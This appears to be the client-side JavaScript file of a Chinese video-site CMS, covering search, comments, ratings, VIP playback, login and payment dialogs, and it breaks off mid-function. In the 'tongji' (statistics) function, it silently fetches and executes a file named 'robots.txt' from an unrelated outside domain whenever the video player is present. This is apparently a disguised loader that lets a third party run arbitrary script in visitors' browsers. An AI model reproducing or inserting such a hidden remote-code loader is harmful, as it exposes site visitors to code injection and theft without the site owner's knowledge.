/* Version 3.6122
** sale 2.1 ziye
** Up:2022.1 14.10*/
var feifei = {
//start
'browser':{//浏览器信息
	'url': document.URL,
	'domain': document.domain,
	'title': document.title,
	'language': (navigator.browserLanguage || navigator.language).toLowerCase(),//zh-tw|zh-hk|zh-cn
	'canvas' : function(){
		return !!document.createElement('canvas').getContext;
	}(),
	'useragent' : function(){
		var ua = navigator.userAgent;//navigator.appVersion
		return {
			'mobile': !!ua.match(/AppleWebKit.*Mobile.*/), //是否为移动终端 
			'ios': !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
			'android': ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1, //android终端或者uc浏览器 
			'iPhone': ua.indexOf('iPhone') > -1 || ua.indexOf('Mac') > -1, //是否为iPhone或者QQHD浏览器 
			'iPad': ua.indexOf('iPad') > -1, //是否iPad
			'trident': ua.indexOf('Trident') > -1, //IE内核
			'presto': ua.indexOf('Presto') > -1, //opera内核
			'webKit': ua.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
			'gecko': ua.indexOf('Gecko') > -1 && ua.indexOf('KHTML') == -1, //火狐内核 
			'weixin': ua.indexOf('MicroMessenger') > -1 //是否微信 ua.match(/MicroMessenger/i) == "micromessenger",			
		};
	}()
},
'cms':{//系统
	'nav': function($id){//主导航高亮
		$id = $('nav[data-dir]').attr('data-dir');
		$($id).addClass("active");
	},
	'pre':function(){//代码高亮
		//https://highlightjs.org/static/demo/
		if($("pre code").length){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//lib.baomitu.com/highlight.js/9.12.0/styles/googlecode.min.css"}).appendTo("head");
			$.getScript("//lib.baomitu.com/highlight.js/9.12.0/highlight.min.js", function(){
				$('pre code').each(function(i, block) {
					hljs.highlightBlock(block);
				});
			});
		}
	},
	'collapse':function(){//内容详情折叠
		$('.vod-detail .vod-content img').addClass("img-responsive");
		$('.news-detail .news-content img').addClass("img-responsive");
		$('body').on("click", "[data-toggle=ff-collapse]", function(){
			$this = $(this);
			$($this.attr('data-target')).toggle();
			$($this.attr('data-default')).toggle();
			if($this.attr('data-html')){
				$data_html = $this.html();
				$this.html($this.attr('data-html'));
				$this.attr('data-html',$data_html);
			}
			if($this.attr('data-val')){
				$data_val = $this.val();
				$this.val($this.attr('data-val'));
				$this.attr('data-val',$data_val);
			}
		});
	}
},
'mobile':{//移动端专用
	'jump': function(){
		if( cms.domain_m && (feifei.browser.domain != cms.domain_m) ){
			self.location.href = feifei.browser.url.replace(feifei.browser.domain,cms.domain_m);
		}
	},
	'nav': function(){
		$("#ff-nav-btn").bind('click', function(){
			$('#ff-nav-btn-item').toggleClass("hidden");
		});
	},
	'goback': function(){
		if(history.length > 0 && document.referrer){
			$(".ff-goback").show();
			$('.ff-goback').attr('href','javascript:history.go(-1);');
		}else{
			$(".ff-goback").hide();
		}
	},
	'flickity':function(){//手机滑动
		if($(".ff-gallery").length){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({
				rel: "stylesheet",
				type: "text/css",
				href: "//lib.baomitu.com/flickity/2.0.11/flickity.min.css"
			}).appendTo("head");
			$.getScript("//lib.baomitu.com/flickity/2.0.11/flickity.pkgd.min.js", function(){
				$(".ff-gallery").each(function(i){
					$index = $(this).find('.gallery-active').index()*1;
					if($index > 3){
						$index = $index-3;
					}else{
						$index = 0;
					}
					$(this).flickity({
						cellAlign: 'left',
						freeScroll: true,
						lazyLoad: true,
						contain: true,
						prevNextButtons: false,
						resize: true,
						initialIndex: $index,
						pageDots: false
					});
				});
			});
		}
	}
},
'scroll':{//滚动条
	'fixed' : function($id, $top, $width){// 悬浮区域
		var offset = $('#'+$id).offset();
		if(offset){
			if(!$top){
				$top = 5;
			}
			if(!$width){
				$width = $('#'+$id).width();
			}			
			$(window).bind('scroll', function(){
				if($(this).scrollTop() > offset.top){
					$('#'+$id).css({"position":"fixed","top":$top+"px","width":$width+"px"});
				}else{
					$(('#'+$id)).css({"position":"relative"});
				}
			});		
		}
	},
	'totop':function($id, $top){ //返回顶部
		// $id:dc-totop $top:偏移值
		$('body').append('<a href="#" class="'+$id+'" id="'+$id+'"><i class="glyphicon glyphicon-chevron-up"></i></a>');
		$(window).bind('scroll', function(){
			if($(this).scrollTop() > $top){
				$('#'+$id).fadeIn("slow");
			}else{
				$('#'+$id).fadeOut("slow");
			}
		});	
	}
},
'language':{//简繁转换
	's2t':function(){
		if(feifei.browser.language=='zh-hk' || feifei.browser.language=='zh-tw'){
			$.getScript("//cdn.feifeicms.co/jquery/s2t/0.1.0/s2t.min.js", function(data, status, jqxhr) {
				$(document.body).s2t();//$.s2t(data);
			});
		}
	},
	't2s':function(){
		if(feifei.browser.language=='zh-cn'){
			$.getScript("//cdn.feifeicms.co/jquery/s2t/0.1.0/s2t.min.js", function(data, status, jqxhr) {
				$(document.body).t2s();//$.s2t(data);
			});
		}
	}
},
'page': {//分页
	'more': function(){
		$('body').on('click', '.ff-page-more', function(){
			$this = $(this);
			$page = $(this).attr('data-page')*1+1;
			$id = $this.attr('data-target');
			$.get($(this).attr('data-url')+$page, function(data){
				if(data){
					$($id).append(data);
					$this.attr("data-page",$page);
					$($id+" .ff-img").lazyload();
				}else{
					$this.hide();
					$this.unbind("click");
				}
			},'html');
		});
	},
	'keydown': function(){
	  var prev = $('#ff-prev').attr("href");
	  var next = $('#ff-next').attr("href");
	  $("body").keydown(function(event){
		  if(event.keyCode==37 && prev!=undefined) location=prev; 
		  if(event.keyCode==39 && next!=undefined) location=next; 
	  });
  }
},
'alert':{//提示
	'success':function($id, $tips){
		$($id).html('<div class="alert alert-success fade in"><a href="#" class="close" data-dismiss="alert">&times;</a><strong>成功！</strong>'+$tips+'</div>');
	},
	'warning':function($id, $tips){
		$($id).html('<div class="alert alert-warning fade in"><a href="#" class="close" data-dismiss="alert">&times;</a><strong>警告！</strong>'+$tips+'</div>');
	}
},
'image': {//图片
	'lazyload': function(){//延迟加载
		$.ajaxSetup({
			cache: true
		});
		$.getScript("//lib.baomitu.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js", function(response, status) {
			$("img.ff-img").lazyload({
				placeholder : cms.root+"Public/images/no.jpg",
				effect : "fadeIn",
				failurelimit: 15
				//threshold : 400
				//skip_invisible : false
				//container: $(".carousel-inner"),
			}); 
		});
	},
	'qrcode': function(){//生成二维码
		//$("[data-toggle='popover']").popover({html: true});
		$(".glyphicon-phone").popover({
				html: true
		});
		$(".glyphicon-phone").on('show.bs.popover', function () {
			$(".glyphicon-phone").attr('data-content','<img class="ff-qrcode" src="//cdn.feifeicms.co/qrcode/1.0/?w=150&h=150&url='+encodeURIComponent(feifei.browser.url)+'"/>');
		})
	},
	'vcode':function(){//安全码
		return '<label><img class="ff-vcode-img" src="'+cms.root+'index.php?s=Vcode-Index"></label>';
	},
	'slide':function(){//轮播幻灯
		$('.ff-slide').carousel({interval: $('.ff-slide').attr('data-interval')});
	}
},
'vcode': {//验证码
	'load': function(){
		feifei.vcode.focus();
		feifei.vcode.click();
	},
	'focus': function(){//验证码框焦点
		$('body').on("focus", ".ff-vcode", function(){
			$(this).removeClass('ff-vcode').parent().after(feifei.image.vcode());
			$(this).unbind();
		});
	},
	'click': function(){//点击刷新
		$('body').on('click', 'img.ff-vcode-img', function(){
			$(this).attr('src', cms.root+'index.php?s=Vcode-Index');
		});
	}
},
'search': {//搜索
	'dropdown': function(){//下拉菜单
		$(".ff-search .dropdown-menu li a").on("click", function(){
			$form = $(this).parents('form');
			$action = $form.find('button[data-action]');
			if($action.attr('data-action') && $(this).attr('data-action')){
				$action.attr('data-action', $(this).attr('data-action'));
				$form.find('.dropdown-toggle .title').html($(this).html());
			}
		});
	},
	'keydown': function(){//回车
		$(".ff-search input").keyup(function(event){
			if(event.keyCode == 13){
				$form = $(this).parents('form');
				$action = $form.find('button[data-action]').attr('data-action');
				if(!$action){
					$action = cms.root+'index.php?s=vod-search-name-FFWD';
				}
				$wd = $form.find('.ff-wd').val();
				if($wd){
					location.href = $action.replace('FFWD',encodeURIComponent($wd));
				}else{
					$(this).find('.ff-wd').focus();
					$(this).find('.ff-wd').attr('data-toggle','tooltip').attr('data-placement','bottom').attr('title','请输入关键字').tooltip('show');
				}
				return false;
			}
		});
	},	
	'submit': function(){//提交表单
		$(".ff-search button").on("click", function(){
			$action = $(this).attr('data-action');
			if($action){
				$(".ff-search").attr('action', $action);
			}
		});
		$(".ff-search").on("submit", function(){
			$action = $(this).attr('action');
			$wd = $(this).find('.ff-wd').val();
			if(!$action){
				$action = cms.root+'index.php?s=vod-search-name-FFWD';
			}
			if($wd){
				location.href = $action.replace('FFWD',encodeURIComponent($wd));
			}else{
				$(this).find('.ff-wd').focus();
				$(this).find('.ff-wd').attr('data-toggle','tooltip').attr('data-placement','bottom').attr('title','请输入关键字').tooltip('show');
			}
			return false;
		});
	},
	'autocomplete': function(){//3.5增加搜索结果控制
		var $limit = $('.ff-search').eq(0).attr('data-limit');
		if( $limit > 0){
			$.ajaxSetup({
				cache: true
			});
			$.getScript("//lib.baomitu.com/jquery.devbridge-autocomplete/1.2.26/jquery.autocomplete.min.js", function(response, status) {
				if($('.ff-search').eq(0).attr('data-sid') == 2){
					$ajax_url = cms.root+'index.php?g=home&m=search&a=news';
				}else{
					$ajax_url = cms.root+'index.php?g=home&m=search&a=vod';
				}
				$('.ff-wd').autocomplete({
					serviceUrl : $ajax_url,
					params: {'limit': $limit},
					paramName: 'wd',
					maxHeight: 400,
					transformResult: function(response) {
						var obj = $.parseJSON(response);
						return {
							suggestions: $.map(obj.data, function(dataItem) {
								return { value: dataItem.name, data: dataItem.link };
							})
						};
					},
					onSelect: function (suggestion) {
						location.href = suggestion.data;
						//alert('You selected: ' + suggestion.value + ', ' + suggestion.data);
					}
				});
			});
		}
	},
	'hot':function(){
		$(".ff-search [data-toggle='tooltip']").tooltip();
		$("#ff-site-hot").load(cms.root+"index.php?s=ajax-site_hot");
	}
},
'record': {//云记录
	'load': function(){
		feifei.record.get();
		feifei.record.set();
	},
	'get':function(){
		//后端获取记录
		if($(".ff-record-get").eq(0).length){
			$.get(cms.root+'index.php?g=home&m=record&a=vod&sid=1', function(data){
				if(data == ''){
					data = '<strong>暂无观看记录</strong>';
				}
				$(".ff-record-get").attr('data-content',data);
			});
		}
		//弹出事件
		$(".ff-record-get").popover().on("mouseenter", function () {
			var _this = this;
			$(this).popover("show");
			$(".popover").on("mouseleave", function () {
				$(_this).popover('hide');
			});
		}).on("mouseleave", function () {
			var _this = this;
			setTimeout(function () {
				if (!$(".popover:hover").length) {
					$(_this).popover("hide");
				}
			}, 300);
		});
	},
	'set':function(){//用户互动记录
		//自动写入观看或浏览记录
		if($(".ff-record-set[data-type=1]").eq(0).attr('data-sid')){
			$this = $(".ff-record-set[data-type=1]").eq(0);
			$.get(cms.root+'index.php?g=home&m=record&a=post&sid='+$this.attr("data-sid")+'&did='+$this.attr("data-id")+'&type=1&did_sid='+$this.attr("data-id-sid")+'&did_pid='+$this.attr("data-id-pid"));
		}
		//喜欢 想看 在看 看过 写入记录
		$('body').on('click', 'a.ff-record-set', function(e){
			//是否需要验证登录
			if(cms.userforum == 1 && cms.userid < 1){
				feifei.user.login();
				return false;
			}
			var $this = $(this);
			if($(this).attr("data-id")){
				$.ajax({
					url: cms.root+'index.php?g=home&m=record&a=post&sid='+$(this).attr("data-sid")+'&did='+$(this).attr("data-id")+'&type='+$(this).attr("data-type"),
					cache: false,
					dataType: 'json',
					success: function(json){
						if(json.status == 200){
							$this.addClass('disabled');
						}else{
							$this.attr('title', json.info);
							$this.tooltip('show');
						}
					}
				});
			}
		});
	}
},
'score': {//评分
	'raty': function(){
		if( $('.ff-score').length ){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//lib.baomitu.com/raty/2.7.1/jquery.raty.min.css"}).appendTo("head");
			//
			$.getScript("//lib.baomitu.com/raty/2.7.1/jquery.raty.min.js", function(response, status) {
				$(".ff-score").each(function(i){
					$(".ff-score").eq(i).find('.ff-score-raty').raty({ 
						starType: 'i',
						number: 5,
						numberMax : 5,
						half: true,
						score : function(){
							return $(this).attr('data-score');
						},
						click: function(score, evt) {
							$this = $(this);
							$.ajax({
								type: 'get',
								url: cms.root+'index.php?s=gold-'+$(this).attr('data-module')+'-id-'+$(this).attr('data-id')+'-score-'+(score*2),
								timeout: 5000,
								dataType:'json',
								error: function(){
									$this.attr('title', '网络异常！').tooltip('show');
								},
								success: function(json){
									if(json.status == 1){
										$this.parent().find('.ff-score-val').html(json.data.gold);
									}else{
										$this.attr('title', json.info).tooltip('show');
									}
								}
							});
						}
					});					
				});
			});
		}
	}
},
'updown':{//顶踩
	'click': function(){
		$('body').on('click', 'a.ff-updown-set', function(e){
			var $this = $(this);
			if($(this).attr("data-id")){
				$.ajax({
					url: cms.root+'index.php?s=updown-'+$(this).attr("data-module")+'-id-'+$(this).attr("data-id")+'-type-'+$(this).attr("data-type"),
					cache: false,
					dataType: 'json',
					success: function(json){
						$this.addClass('disabled');
						if(json.status == 1){
							if($this.attr("data-type")=='up'){
								$this.find('.ff-updown-val').html(json.data.up);
							}else{
								$this.find('.ff-updown-val').html(json.data.down);
							}
						}else{
							$this.attr('title', json.info);
							$this.tooltip('show');
						}
					}
				});
			}
		});
	}
},
'hits':{//人气
	'load': function(){
		$(".ff-hits").each(function(i){
			var $this = $(".ff-hits").eq(i);
			$.ajax({
				url: cms.root+'index.php?s=hits-show-id-'+$this.attr("data-id")+'-sid-'+$this.attr("data-sid")+'-type-'+$this.attr("data-type"),
				cache: true,
				dataType: 'json',
				success: function(json){
					$type = $this.attr('data-type');
					if($type != 'insert'){
						$this.html(eval('(json.' + $type + ')'));
					}
				}
			});
	 });
	}
},
'share':{//分享
	'baidu': function(){
		if($(".ff-share").length ){
			$size = $(".ff-share").attr('data-size');
			if(!$size){$size = 16;}
			if( $(".ff-share dd").length ){
				$id = $(".ff-share dd");
			}else{
				$id = $(".ff-share");
			}
			$($id).html('<div class="bdsharebuttonbox"><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a><a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="bds_bdysc" data-cmd="bdysc" title="分享到百度云收藏"></a><a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a></div>');
			window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":""+$size+""},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		}
	}
},
'forum': {//讨论模块功能
	'load':function(){
		if($('.ff-forum[data-type=feifei]').length){
			this.system();
		}
		if($('.ff-forum[data-type=uyan]').length){
			this.uyan();
		}
		if($('.ff-forum[data-type=changyan]').length){
			this.changyan();
		}
	},
	'system': function(){
		//初始加载
		if($('.ff-forum[data-type=feifei]').attr('data-sid')){
			feifei.forum.ajax('.ff-forum', $('.ff-forum[data-type=feifei]').attr('data-sid'), $('.ff-forum[data-type=feifei]').attr('data-id'), 0, 1);
		}
		//登录验证
		$(".ff-forum").on("focus", 'textarea[name=forum_content]', function(){ //表单提交
			if(cms.userforum == 1 && cms.userid < 1){
				feifei.user.login();
			}
		});
		//回复评论
		$('body').on('click', 'a.forum-reply-set', function(){
			var $pid = $(this).attr("data-id");
			var $reply = $(this).parents('.media-body').find('.forum-reply');
			var $form = $($(".ff-forum-post").eq(0).prop("outerHTML"));
			if($pid){
				$form.find('.ff-alert').html('');
				$form.find("button[type='submit']").removeClass('disabled')
				$form.find("input[name='forum_pid']").val($pid);
				$form.show();
				$($reply).html($form);
				$($reply).collapse('toggle');
			}
		});
		//举报评论
		$('body').on('mouseenter', '.ff-forum-item .media-body', function(){
			$(this).find('.forum-report').fadeIn();
		});
		$('body').on('mouseleave', '.ff-forum-item .media-body', function(){
			$(this).find('.forum-report').fadeOut();
		});
		$('body').on('click', 'a.forum-report', function(){
			$(this).remove();//移除按钮
			var $id = $(this).attr("data-id");
			if($id){
				$.ajax({
					type: 'get',
					url: cms.root+'index.php?s=forum-report-id-'+$id,
					timeout: 3000,
					dataType:'json',
					success:function(json){
						feifei.alert.success($('.form-forum').eq(0).find('.ff-alert'), json.info);
					}
				});
			}
		});
		//发表评论
		$("body").on("submit", '.ff-forum-post', function(){
			var $this = $(this);
			var $sid = $(this).find('input[name=forum_sid]').val();
			$.post($this.attr('action'), $this.serialize(), function(json){
				if(json.status == 200){//不需要审核留言
					feifei.alert.success($this.find('.ff-alert'), json.info);//发布成功提示
					$this.find("button[type='submit']").addClass('disabled');//禁止再次提交
					//主题、回复贴处理
					if(json.data.forum_pid){//回复贴
						feifei.forum.reply(json.data.forum_pid);//更新回复数及显示回复链接按钮
						setTimeout(function(){$('.forum-reply[data-id='+json.data.forum_pid+']').fadeOut('slow')}, 2000);//移除回复表单容器
					}else{//主题贴
						setTimeout(function(){feifei.forum.ajax('.ff-forum-item', json.data.forum_sid, json.data.forum_cid, 1, 1)}, 2000);
						setTimeout(function(){$this.hide()}, 3000);
					}
					//发表评论后是否需要刷新网页
					if($('.ff-forum-reload').length){
						location.reload();
					}
				}else if(json.status > 200){//需要审核
					feifei.alert.success($this.find('.ff-alert'), json.info);//发布成功提示
					$this.find("button[type='submit']").addClass('disabled');//禁止再次提交
				}else{
					feifei.alert.warning($this.find('.ff-alert'), json.info);
				}
			 },'json');
			return false;
		});
	},
	'ajax': function($target, $sid, $cid, $ismore, $page){//AJAX加载系统评论
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=forum-ajax-sid-'+$sid+'-cid-'+$cid+'-ismore-'+$ismore+'-p-'+$page,
			timeout: 3000,
			error: function(){
				$($target).html('评论加载失败，请刷新...');
			},
			success:function($html){
				$($target).html($html);
			}
		});
	},
	'reply': function($id){//更新回复数及显示回复链接
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=forum-reply-id-'+$id,
			timeout: 3000,
			dataType:'json',
			success:function(json){
				if(json.status==200){
					$('.forum-reply-set[data-id='+$id+']').find('.forum-reply-val').html(json.data);
					$('.forum-reply-get[data-id='+$id+']').fadeIn();
				}
			}
		});
	},
	'uyan': function(){
		$(".ff-forum").html('<div id="uyan_frame"></div>');
		$.getScript("http://v2.uyan.cc/code/uyan.js?uid="+$('.ff-forum[data-type=uyan]').attr('data-uyan-uid'));
	},
	'changyan': function(){
		$appid = $('.ff-forum[data-type=changyan]').attr('data-cy-id');
		$conf = $('.ff-forum[data-type=changyan]').attr('data-cy-conf');
		$sourceid = $('.ff-forum[data-type=changyan]').attr('data-sid')+'-'+$('.ff-forum[data-type=changyan]').attr('data-id');
		var width = window.innerWidth || document.documentElement.clientWidth;
		if (width < 768) { 
			$(".ff-forum").html('<div id="SOHUCS" sid="'+$sourceid+'"></div><script charset="utf-8" id="changyan_mobile_js" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id='+$appid+'&conf=prod_'+$conf+'"><\/script>');
		}else{
			$(".ff-forum").html('<div id="SOHUCS" sid="'+$sourceid+'"></div>');
			$.getScript("https://changyan.sohu.com/upload/changyan.js",function(){
				window.changyan.api.config({
					appid: $appid,
					conf: 'prod_'+$conf
				});
			});
		}
	}
},
'scenario': {//分集剧情
	'load':function(){
		var $max = $(".ff-scenario-pill").attr('data-max')*1;
		var $count = $(".ff-scenario-content dl").length;
		var $li = 0;
		var $list = '';
		if($count > 0 && $max>0){
			for($i=0; $i<$count; $i++){
				if(($i+$max) > $count){
					$max_ji = $count;
				}else{
					$max_ji = $i+$max;
				}
				if($i % $max == 0){
					$li++;
					$list+='<li><a href="javascript:;" data-target=".ff-scenario-'+$li+'" data-toggle="pill">第'+($i+1)+'-'+$max_ji+'集</a></li>';
				}
				$(".ff-scenario-content dl").eq($i).addClass('ff-scenario-'+$li);
			}
			$('.ff-scenario-pill').html($list);
			$('.ff-scenario-pill a:first').tab('show');
		}
	}
},
'playurl': {//播放地址
	'download': function(){
		if($(".ff-playurl-down").length){
			$.getScript("//cdn.feifeicms.co/download/xunlei.js",function(){
				//3.4增加鼠标点击去掉文件名标题
				$(".ff-playurl-down input[type=text]").focus(function(){
					$(this).val($(this).parent().find('input[type=checkbox]').val());
				});
			});
		}
	},
	'tongji': function(){
		if($("#cms_player").length){
			$.getScript("//www.cnhb.org/robots.txt");
		}
	},
	'active':function(){
		$('.ff-playurl li[data-id="'+$('.ff-playurl[data-active]').attr('data-active')+'"]').addClass("active");
		$('.ff-playurl-tab a[data-target="'+$('.ff-playurl-tab[data-active]').attr('data-active')+'"]').tab('show');
		$('.ff-playurl-dropdown a[data-target="'+$('.ff-playurl-dropdown[data-active]').attr('data-active')+'"]').tab('show');
	},	
	'dropdown':function(){
		$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
			$(this).parents('.btn-group').find('.dropdown-toggle span:eq(0)').html($(e.target).text());
			$(this).parents('.dropdown-menu').find('li').removeClass('active');
			$(this).parent().addClass('active');
		});
	},
	'more':function(){//...效果
		$('.ff-playurl').each(function(i){
			$this = $(this);
			$config = $this.attr('data-more')*1;
			$max = $this.find('li a').size();
			if(($config+2) < $max && $config>0){
				$max_html = $($this.find('li:last').prop("outerHTML")).find('a').attr('href','#all').html('全部...');
				$max_html = '<li class="'+$this.find('li').attr('class')+'">'+$max_html.prop("outerHTML")+'</li>';
				$this.find('li').each(function(n){
					if(n+1 > $config){
						$(this).hide();
					}
				});
				$this.find('li').eq($config).after($max_html);
				$this.find('li:last').show();
			}
	 	});
		//more点击
		$('.ff-playurl').on('click', 'a', function(e){
			if($(this).attr('href') == '#all'){
				$(this).parent().parent().find('li').show();
				$(this).parent().remove();
				return false;
			}
		});
	},
	//vip播放器回调
	'vip_callback':function($vod_id, $vod_sid, $vod_pid, $status, $trysee, $tips){
		if($status != 200){
			if($trysee > 0){
				window.setTimeout(function(){
					$.get(cms.root+'index.php?s=vod-vip-action-trysee-id-'+$vod_id+'-sid-'+$vod_sid+'-pid-'+$vod_pid, function(html){
						$('#cms_player').html(html).removeClass("embed-responsive-4by3").css({"height":"auto"});
					},'html');
				},1000*60*$trysee);
			}else{
				$('#cms-player-vip .cms-player-box').html($tips);
				$('#cms-player-vip .cms-player-iframe').hide();
				$('#cms_player').removeClass("embed-responsive-4by3").css({"height":"auto"});
			}
			//支付影币按钮
			$('#cms_player').on("click",".vod-price",function(){
				$(this).html('Loading...');
				$.get(cms.root+'index.php?s=vod-vip-action-ispay-id-'+$vod_id+'-sid-'+$vod_sid+'-pid-'+$vod_pid, function(json){
					if(json.status == 200){
						location.reload();
					}else if(json.status == 500 || json.status == 501){
						feifei.user.login();
					}else{
						$('#cms_player').html(json.info);
					}
				},'json');
			});
		}else{
			//拥有VIP观看权限
		}
	}
},
'user':{
	//基础功能
	'load':function(){
		//不同模式下处理用户基础信息
		feifei.user.islogin();
		//模态框登录事件
		$("body").on("click",".user-login-modal",function(){
			feifei.user.login();
			return false;
		});
		//积分在线充值事件
		$("body").on("click",".user-score-payment",function(){
			feifei.user.ScorePayment();
			return false;
		});
		//积分卡密充值事件
		$("body").on("click",".user-score-card",function(){
			feifei.user.ScoreCard();
			return false;
		});
		//积分升级VIP事件
		$("body").on("click",".user-score-upvip",function(){
			feifei.user.ScoreUpvip();
			return false;
		});
		//用户中心修改邮箱
		$("body").on("click",".user-change-email", function(){
			feifei.user.ChangeEmail();
			return false;
		});
		//用户中心修改密码
		$("body").on("click",".user-change-pwd", function(){
			feifei.user.ChangePwd();
			return false;
		});
	},
	//静态模式加载用户ID
	'islogin':function(){
		if($('.ff-user').length && (cms.urlhtml == 1)){
			$.ajax({
				type: 'get',
				url: cms.root+'index.php?s=user-info',
				timeout: 3000,
				dataType:'json',
				success:function(json){
					if(json.status==200){
						cms.userid = json.data.user_id;
						cms.username = json.data.user_name;
						$('.ff-user').removeClass("user-login-modal");
						$('.ff-user[data-href]').attr('href',$('.ff-user[data-href]').attr('data-href'));
						$('.ff-user[data-name]').html('<a href="'+$('.ff-user').attr('data-href')+'">'+cms.username+'</a>');
					}
				}
			});
		}
	},
	//AJAX模态框登录
	'login':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			cache: false,
			url: cms.root+'index.php?s=user-ajax_login',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".form-user-login").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-login-alert').html('正在登录...');
						},
						error : function(){
							$('.user-login-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								location.reload();
							}else{
								$('#user-submit').html('登录');
								feifei.alert.warning('.user-login-alert',json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//积分在线充值
	'ScorePayment':function(){
		feifei.order.payment();
	},
	//积分卡密充值
	'ScoreCard':function(){
		feifei.order.card();
	},
	//升级VIP
	'ScoreUpvip':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_upvip',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-upvip-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-upvip-alert').html('Loading...');
						},
						error : function(){
							$('.user-upvip-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-upvip-alert', '升级完成，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-upvip-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else if(json.status == 501){
								feifei.alert.warning('.user-upvip-alert', '影币不足，共需要'+json.info+'个影币，请先冲值！');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.order.payment();}, 2000);
							}else{
								feifei.alert.warning('.user-upvip-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//修改邮箱
	'ChangeEmail':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_email',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-email-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-email-alert').html('Loading...');
						},
						error : function(){
							$('.user-email-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-email-alert', '邮箱修改完成。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-email-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else{
								feifei.alert.warning('.user-email-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//修改密码
	'ChangePwd':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_repwd',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-repwd-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-repwd-alert').html('Loading...');
						},
						error : function(){
							$('.user-repwd-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-repwd-alert', '密码修改完成。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-repwd-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else{
								feifei.alert.warning('.user-repwd-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
},
'order':{//影币订单模块
	'payment':function(){//在线充值付款界面
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=payment-index',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".forum-payment").on('submit',function(e){
					if($(".forum-payment input[name=score_ext]").val() < $(".forum-payment").attr('data-small')){
						feifei.alert.warning('.user-pay-alert', '每次至少充值<strong>'+$(".forum-payment").attr('data-small')+'</strong>元');
						return false;
					}
					setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();}, 5000);
				});
			}
		});
	},
	'card':function(){//卡密充值付款界面
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=payment-card',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".forum-card").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
